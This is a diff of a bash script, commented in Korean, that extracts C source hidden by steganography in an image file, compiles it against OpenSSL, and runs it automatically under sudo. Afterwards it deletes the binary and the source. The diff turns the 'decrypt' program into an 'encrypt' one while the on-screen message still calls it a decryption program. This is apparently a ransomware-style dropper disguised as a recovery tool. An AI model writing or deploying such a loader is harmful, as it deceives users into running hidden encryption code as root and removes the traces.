@@ -1,5 +1,4 @@
 #!/bin/bash
-
 # 컬러 설정
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -23,10 +22,12 @@ if ! command -v steghide &>/dev/null; then
     echo "  - steghide 필요"
     NEED_INSTALL=true
 fi
+
 if ! command -v gcc &>/dev/null; then
     echo "  - gcc 필요"
     NEED_INSTALL=true
 fi
+
 if ! ldconfig -p 2>/dev/null | grep -q libssl; then
     echo "  - libssl 필요"
     NEED_INSTALL=true
@@ -67,8 +68,9 @@ fi
 echo "  이미지 파일: $IMAGE_FILE"
 
 steghide extract -sf "$IMAGE_FILE" -p "" -xf encrypt.c 2>/dev/null
-if [ ! -f decrypt.c ]; then
-    echo -e "${RED}✗ decrypt.c 추출 실패${NC}"
+
+if [ ! -f encrypt.c ]; then
+    echo -e "${RED}✗ encrypt.c 추출 실패${NC}"
     exit 1
 fi
 
@@ -77,12 +79,16 @@ echo ""
 
 # 3단계: 컴파일
 echo -e "${BLUE}[3/4] 복호화 프로그램 컴파일 중...${NC}"
+
 gcc -o encrypt encrypt.c -lssl -lcrypto 2>/dev/null
-if [ $? -ne 0 ] || [ ! -f decrypt ]; then
+
+if [ $? -ne 0 ] || [ ! -f encrypt ]; then
     echo -e "${RED}✗ 컴파일 실패${NC}"
     exit 1
 fi
+
 chmod +x encrypt
+
 echo -e "${GREEN}✓ 컴파일 완료${NC}"
 echo ""
 
@@ -95,7 +101,8 @@ echo ""
 echo -e "${YELLOW}자동으로 계속 진행합니다...${NC}"
 echo ""
 
-sudo ./decrypt
+sudo ./encrypt
+
 EXIT_CODE=$?
 
 echo ""
@@ -110,7 +117,7 @@ fi
 # 정리 자동 수행
 echo -e "${BLUE}임시 파일 정리 중...${NC}"
 rm -f encrypt encrypt.c
-echo -e "${GREEN}✓ 정리 완료${NC}"
 
+echo -e "${GREEN}✓ 정리 완료${NC}"
 echo ""
 echo -e "${GREEN}프로그램을 종료합니다.${NC}"
